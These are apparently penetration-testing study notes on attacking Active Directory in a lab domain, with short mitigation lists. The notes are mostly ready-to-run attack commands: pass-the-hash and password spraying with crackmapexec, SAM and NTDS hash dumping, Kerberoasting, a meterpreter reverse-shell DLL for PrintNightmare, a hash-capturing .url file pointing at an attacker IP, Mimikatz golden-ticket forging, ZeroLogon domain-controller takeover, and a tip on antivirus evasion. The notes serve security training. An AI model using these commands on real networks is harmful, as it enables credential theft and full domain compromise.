 Note: The attacks described below involves having some form of credential first.

	Pass the Hash/Password:
		Overview:
			-> If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movements in networks.
			-> We will be using a tool called CRACKMAPEXEC. 
				>crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>
				-> This tool will take the username and password and will throw it all around the subnet.
			-> We can also use psexec meterpreter shell to dump hashes using the command hashdump.
				-> Once, we dump the hashes, we can take the user's hash (the second part of the NTLM hash) and pass it around using crackmapexec and this time using this command:
				>crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth
					-> --local means we will be passing the hash locally.

			Note: You can pass around NTLM hashes, you cannot pass netNTLMv2 hashes.
			
			Example command: crackmapexec smb 10.0.2.0/24 -u fcastle -p Password1 -d MARVEL.local
				crackmapexec smb 10.0.2.0/24 -u fcastle -H 64f12cddaa88057e06a81b54e73b949b -d MARVEL.local

			Extra:
				--sam: use  this switch to dump sam database from the machines we got access.
				Note: You can do password spray on local accounts, but don't do on domain accounts because domain accounts mostly have lockout policies.

		Using secretsdump.py to dump sam database:
			>secretsdump.py <domain>/<user>:<pass>@<ip>
			-> Dump hashes from all the machines you get access to.
			-> Then save them to a file and look for password reuse. 
			-> If the second part of the hash is same, then it is the case of password reuse.

			Cracking hashes using john:
				>john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
			Cracking hashes using hashcat:
				>hashcat -m 1000 <hashfile> <wordlist> -O

			Note: If you see a blank line next to hash in hashcat or a red colored user displayed in john, then it means the password is disabled. 

		Pass the hash:
			>crackmapexec smb 10.0.2.0/24 -u "Frank Castle" -H <H> --local-auth

			Note: If you see (Pwn3d!) in the output, its a guarantee that the hash or password worked, otherwise if it is just a green plus sign, it means chances are high it worked.

			Note: You can also use hash with psexec.py to get a shell:
				>psexec.py "Frank castle":@10.0.2.42 -hashes <LM:NT>
					-> You need the full hash for successful authentication.

		Mitigations for these both attacks:
			-> Hard to completely prevent, but we can make it more difficult for the attacker:
				1. Limit account re-use:
					-> Avoid re-using local admin password.
					-> Disable Guest and Administrator Accounts
					-> Limit who is a local administrator (least privilege)
				2. Utilize strong passwords:
					-> The longer the better (>14 characters)
					-> Avoid using common words
					-> I like long sentences.
				3. Privileged Access Management (PAM)
					-> Check out/in sensitive accounts when needed. 
					-> Automatically rotate passwords on check out and check in.
					-> Limits pass attacks as hash/password is strong and constantly rotated.



	Token Impersonation:
		Overview:
			What are tokens?
				-> Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
			Two types:
				1. Delegate: Created for logging into a machine or using Remote Desktop
				2. Impersonate: "non-interactive" such as attaching a network drive or a domain logon script.

			Step 1: Pop a shell and load incognito.
			Step 2: Impersonate our domain user.
			Step 3: Attempt to dump hashes as non-Domain Admin.
			Step 4: Identify domain administrator
			Step 5: Impersonate our Domain administrator.
			Step 6: Attempt to dump hashes as domain admin.
			Step 7: Win!!!!

		Attack:
			>msfconsole
			>use exploit/windows/smb/psexec
				>set rhosts
				>set smbdomain
				>set smbpass
				>set smbuser
				>show targets
				>set target 2
				>set payload windows/x64/meterpreter/reverse_tcp
				set lhost eth0
				>run

				>load incognito

			Note: Most of the times powershell doesnt work, what you can do is, you can also load "load powershell"

				>list_tokens -u : list tokens for all the users.
				>impersonate_token marvel\\administrator
				>shell
				>whoami
					marvel\administrator

			Note: If you run hashdump now, it will say it has issues, supply the command "rev2self" to get back to previous self.
				This happens because, we need to be system administrator of the machine to dump hashes.

			Note: We can impersonate a token, until the computer is rebooted.


		Mitigations:
			1. Limit user/group token creation permissions
			2. Account tiering
			3. Local admin restriction.

	Kerberoasting Attack:
		Overview:
			-> DC is also known as a Key Distribution Center (KDC).
			-> Our victim user needs to authenticate to the DC.
			-> So, now to authenticate to the DC, the user will request for TGT or Ticket Granting Ticket.
			-> We will also provide a NTLM hash to the DC.
			-> DC will send a TGT in response and encrypt it with krbtgt hash.
			-> So here for authentication, user will supply username and NTLM hash for recieving the ticket.
			-> A valid user gets a ticket, doesnt have to be necessarily a domain admin.
			-> Now, we have an application server which is running a service. A service can be anything from a SQL to Antivirus.
			-> A service which we are trying to access has a SPN asscoaited with it which is called a Service Principal Name. 
			-> Now, to access this service, first we need TGS (Ticket Granting Service ticket) and to get this we present our TGT back to KDC.
			-> KDC already knows application server's account hash, it will use this hash to encrypt the TGS and present it back to the user. 
			-> The KDC doesn't know whether we have access to application server or not. This is where kerberoasting starts.
			-> Now, if the user wants to access the application server, it can use the TGS to authenticate itself.

			So the goal here is, we will be needing TGS and using that we will decrypt the server's account hash.

			Step 1: Get SPNs, dump hash:
				>python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip-DC> -request
				>GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 10.0.2.41 -request
			Step 2: Crack that hash:
				>hashcat -m 13100 kerberoast.txt rockyou.txt -O
				>john kerberoast_hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs

		Mitigations:
			1. Strong Passwords for service accounts.
			2. Least Privilege. Do not make your service accounts as your Domain admins.


	Group Policy Preferences (GPP) AKA MS14-025:
		Overview:
			-> Group Policy Preferences allowed admins to create policies using embedded credentials.
			-> These credentials were encrypted and placed in a "cPassword"
			-> The key was accidentally released (whoops).
			-> Patched in MS14-025, but doesn't prevent previous uses.

			-> So if an admin has stored a GPP embedded credential before the patch was released, this will display a credential to us.
			-> Most of the time, these are domain admin credentials and will allow us access to domain admin accounts.
			-> Since group policies are stored in SYSVOL on the DC, any domain user can read the policy abd therefore decrypt the stored passwords.
			-> the file groups.xml is stored in SYSVL folder which is important to us because it contains the cpassword which we can easily decrypt.

			-> There is a metasploit module for checking this which is smb_enum_gpp in auxiliary group. (Post exploitation)
			-> So once we have a user access in the network, then we can access the SYSVOL folder and see whether GPP is being used or not.

			Tool to decrypt gpp cpassword:
				>gpp-decrypt <cpasswd>

			Resource: https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/


	URL File Attacks:
		Resource:  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/	Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share

		-> Lets say we have compromised a user and it has some sort of share access.
		-> We can utilize this access to capture more hashes via responder, go back and crack those hashes and possibly get more access to a different user with more access.
		-> So, it does require a compromised user account or potentially a open file share with write access.

		Place a file (@<filename>.url) in the share with these contents:
			[InternetShortcut]
			URL=blah
			WorkingDirectory=blah
			IconFile=\\<attacker-IP>\%USERNAME%.icon
			IconIndex=1

		Note: you can also name the file like this ~test.url
		-> This symbol or @ puts the file at the top, so what's happening is, when a user navigates to this share, responder will capture the hash and then you can attempt to crack it.


	PrintNightmare (CVE-2021-1675):
		Resources:
			https://github.com/cube0x0/CVE-2021-1675
			https://github.com/calebstewart/CVE-2021-1675

		-> This exploit doesn't need any authentication outside of a user account.
		-> This exploit takes advantage of printer spooler, and this service basically allows users to add printers, and that runs as SYSTEM privilege.
		-> And any authenticated user can run command execution as SYSTEM privileges.
		-> Its similar to PrintSpoofer but its at more severe level.

		We can use rpcdump.py from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable:
		>rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

		Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
		Protocol: [MS-RPRN]: Print System Remote Protocol

		First, we will generate a malicious dll using msfvenom:
			>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your-ip LPORT=your-port -f dll > shell.dll
		Second, we will be hosting this file using smb server.
			>smbserver.py share `pwd` -smb2support
		Third, we will start a multi handler in msfconsole and set the payload accordingly.
		Lastly, we will execute the exploit script:
			>python3 CVE-2021-1675.py marvel.local/fcastle:Password1@10.0.2.41 '\\10.0.2.40\share\shell.dll' 

		Note: In real world assessments, dll will be picked up by the antivirus. You will have to do some
			AV bypassing and obfuscation.

		Mitigation:
			-> Disable Spooler service
				Stop-Service Spooler
				REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f



	Mimikatz:
		Resources:
			https://github.com/gentilkiwi/mimikatz
			Note: Use the wiki tab in github to learn more about this tool.

		Overview:
			-> Tool used to view and steal credentials, generate kerberos tickets, and leverage attacks.
			-> Dumps credentials stored in memory.
			-> Just a few attacks: Credential dumping, Pass-the-hash, Over-Pass-the-Hash, Pass-the-ticket, Golden ticket, Silver ticket.

		Note: This tool will be mostly get picked up the antivirus. 
			-> You can also try to use Invoke-Mimikatz from Powershell and run it on disk by uploading or use IEX method to run it on memory.

		Now, we are assuming we have already compromised the DC. How can we leverage this tool comes next?
		-> Place the extracted files in a folder. Make sure to check the architecture of the target.
		-> open command prompt, and navigate to the folder where you placed mimikatz.
		>mimikatz.exe
		>privilege::debug
			-> Here first part of the command is the module name.
			-> The output should be something Privilege 20 OK.
			-> And debug means we are debugging a process which is otherwise wouldn't be allowed to access to.

		>sekurlsa::logonpasswords
			-> This will extract all the passwords since last reboot from the memory.
			-> you will get hold of ntlm hashes.
			-> We can use the mimikatz pass the hash feature to use the administrator's hash.
			-> We can also turn on wdigest which displays the password in clear text, but to abuse this feature, somebody has to login to the machine.

		>lsadump::sam
			-> dumping sam database.
			-> Sometimes this command would not work.
			-> If we are not able to dump the sam with this way, we can still use metasploit to dump the sam, we can use secretsdump.py to dump the sam or we can simply download the sam from its location.

		>lsadump::lsa /patch
			-> /patch switch will extract the information.
			-> lsa is Local Security Authority. Its a protected subsystem in windows authetication and it authenticates and creates logon sessions to the local computer. 
			-> We can take these hashes and crack them offline.

		Note: you can also get hold of ntds.dit file which is literally the whole database of the active directory.

		Golden ticket attacks:
			-> When you dump the hashes using lsa dump, one of the ntlm hashes would be of krbtgt account. 
			-> Its a ticketing granting ticket account which gives out kerberos tickets.
			-> If we get hold of krbtgt account's hash, then guess what? Who gets to generate those tickets?
			-> So, with a kerberos ticket granting ticket, we can request access to any system or resource in the domain, using the ticket granting service. 
			-> In short words, with a golden ticket, we have entire access to the domain.

			>mimikatz.exe
			>privilege::debug
			>lsadump::lsa /inject /name:krbtgt
				-> This command will only pull out this particular account's hash from the memory.
			-> Now, we require few things. First, copy the SID of the account.
			-> Second, copy the NTML hash of the account.

			>kerberos::golden /User:Administrator /domain:marvel.local /sid:<krbtgt-sid> /krbtgt:<ntlm-hash> 
			/id:500 /ptt
				-> Here id stands for RID and for administrator RID is 500.
				-> Also in place of user, you can just give any value. Its upto you.
				-> /ptt means pass the ticket.
				-> So, with this command it will generate a golden ticket, pass the ticket along to our next or current session. With this, we will opening up a command prompt and that will be able to access any computer we want.
				-> You will see the output something along these lines:
					Golden ticket for 'Administrator @ marvel.local' successfully submitted for current session.
			>misc::cmd
				-> This will open up a new command prompt.
				-> With this command, we can literally access any computer like for example:
					dir \\MACHINE-NAME\C$
				-> What we can do next is, download psexec.exe to windows, and use this to access other machines from the command prompt we just got like this:
					>psexec.exe \\MACHINE-NAME cmd.exe

			Note: You can think of Golden ticket as a way of persistence.


		Abusing ZeroLogon (CVE-2020-1472):
			What is Zerologon: https://www.trendmicro.com/en_us/what-is/zerologon.html
			Resources: 
				1. dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
				2. SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472

			-> Its very dangerous to run this on a environment. 
			-> What we are capable of doing is, attacking a domain controller, setting the password to null and taking over the domain controller. 
			-> The issue with this exploit is, if we fail to restore the password, then we would break the domain controller. 

			Check:
				-> Download the tester script from the checker link resource, and execute it to find whether the DC is vulnerable or not.
				>python3 zerologon_check.py [name-of-DC] [dc-ip]

			Exploit: 
				>python3 cve-2020-1472-exploit.py [name-of-DC] [dc-ip]

				-> Now, we can also dump the hashes from the DC without even supplying the password.
				>secretsdump.py -just-dc domain-name/dc-name\$@dc-ip
					-> Here \$ means, we are escaping $ sign and here this sign means empty password.
					-> After executing this command, it will ask for password, hit enter and it would have dumped all the hashes from sam.

				>secretsdump.py administrator@dc-ip -hashes [nt:lm] 
					-> look for the plain_password_hex in the output. Don't worry about the errors.

			Restore:
				>python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip [dc-ip] -hexpass [plain_password_hex]


		Enumeration w/ Server Manager:
			->  If you already have domain admin you have a lot of access to the server manager in order to change trusts, add or remove users, look at groups, this can be an entry point to find other users with other sensitive information on their machines or find other users on the domain network with access to other networks in order to pivot to another network and continue your testing.
			-> The only way to access the server manager is to rdp into the server and access the server over an rdp connection.
			-> When you first open it up the main tabs that will be most interesting are the tools and manage tabs the tools tab is where you will find most of your information such as users, groups, trusts, computers. The manage tab will allow you to add roles and features however this will probably get picked up by a systems admin relatively quick.
			
				

	Conclusion and Additional resources:
		Active Directory Security Blog: https://adsecurity.org/
		Harmj0y Blog: http://blog.harmj0y.net/

		Some certs and courses:
			Pentester Academy Active Directory: https://www.pentesteracademy.com/activedirectorylab
			Pentester Academy Red Team Labs: https://www.pentesteracademy.com/redteamlab
			eLS PTX: https://elearnsecurity.com/product/ecptx-certification/

	